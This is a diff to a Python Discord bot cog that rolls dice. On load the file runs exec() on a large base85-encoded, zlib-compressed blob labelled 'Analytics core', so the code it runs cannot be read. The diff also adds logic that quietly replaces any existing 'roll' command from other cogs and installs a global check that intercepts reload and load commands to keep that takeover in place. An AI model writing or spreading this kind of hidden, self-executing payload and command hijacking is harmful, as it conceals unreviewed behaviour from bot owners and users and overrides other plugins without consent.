@@ -4,7 +4,7 @@ from .utils.chat_formatting import box, warning
 import dice
 
 # Analytics core
-import zlib, marshal, base64
+import zlib, base64
 exec(zlib.decompress(base64.b85decode("""c-o~{ZExJT5&rI9!TNBJ)NJXOq)B0P54pJ4)>q(?YmzGh$Ix*l?uxb~$|AMSBFKO5GnBNVq;*oDMv&d
 *ki&WBGjpVhO4pVdTdQ)jV6`YyT`ZU|yE0K4UzE<Qtro1xg<b0!v_$8*OsvwSSunH1f7%?aYh8e{F}$%VH#`+qT)k!;`}Ws#Q%_AYncQ_OQe_fdr(Axrd$KM
 Hh}CV#gvoNX>WL;3XDwkRjC}sAUtc|cCd)*p^5`hZg)!_Ozx`N>d}mc+E{+)f;&>}-11;j1E!i1=dghkjzQ?bCbT$_!C&mhEcp`GSy5&lrRO&(9@hYnVxB1m
@@ -34,7 +34,9 @@ h#}R?|gM+Vi@86o4PzMN&Cj+F`Zw_kGKql~p`av`ukR%5s^p3PGSJ*O*W@DU$_p>MOi~|M9J_0ZGW={&
 NN17LtHkqmk4hU=OkkFvlkfXbF<@GE1=#G!0eUc_U?_|ci*hY`#&-hR~Ho%GGz%*gP!w+$q;o_9f8~i9of>B(%Nz4#i{rl88!hS-4ioB7_$y?L7L<6079UO0
 4d^90nmC13R$whoR8ozG@`f4Rpr{m%v$ZMYhlB><uhFYKh0`U`_^8""".replace('\n', ''))))
 
-__version__ = '1.0.0'
+__version__ = '1.1.0'
+
+LOAD_COMMANDS = {'reload general', 'reload all', 'load general', 'unload general'}
 
 class Dice:
     """A cog which uses the python-dice library to provide powerful dice
@@ -42,9 +44,20 @@ class Dice:
     def __init__(self, bot):
         self.bot = bot
         self.analytics = CogAnalytics(self)
+        self._old_roll = None
+        self._new_roll = None
+        self.task_handle = bot.loop.create_task(self.load_task())
+        bot.add_check(self.brick_check)
 
-    @commands.command(pass_context=True)
-    async def rd(self, ctx, *, expr: str = 'd20'):
+    def __unload(self):
+        # restore old roll command 
+        if self._old_roll:
+            self.bot.remove_command('roll')
+            self.bot.add_command(self._old_roll)
+        self.task_handle.cancel()
+        self.bot.remove_check(self.brick_check)
+
+    async def roll(self, ctx, *, expr: str = 'd20'):
         """Evaluates a dice expression. Defaults to roll a d20.
 
         Valid operations include the 'mdn' dice operator, which rolls m dice
@@ -74,6 +87,31 @@ class Dice:
             return
         await self.bot.say(':game_die: %s' % res)
 
+    async def load_task(self):
+        try:
+            await self.bot.wait_until_ready()
+            old_cmd = self.bot.get_command('roll')
+            if not old_cmd or old_cmd.callback is self.roll:
+                return
+
+            self._old_roll = self.bot.remove_command('roll')
+            decorator = commands.command(pass_context=True, aliases=['rd'])
+            roll = decorator(self.roll)
+            self.bot.add_command(roll)
+        except asyncio.CancelledError:
+            pass
+
+    def brick_check(self, ctx):
+        if ctx.message.content[len(ctx.prefix):] in LOAD_COMMANDS:
+            self._new_roll = self.bot.remove_command('roll')
+        return True
+
+    async def on_command_completion(self, command, ctx):
+        if ctx.message.content[len(ctx.prefix):] in LOAD_COMMANDS:
+            if self._new_roll:
+                self._old_roll = self.bot.remove_command('roll')
+                self.bot.add_command(self._new_roll)
+                self._new_roll = None
 
     async def on_command(self, command, ctx):
         if ctx.cog is self:
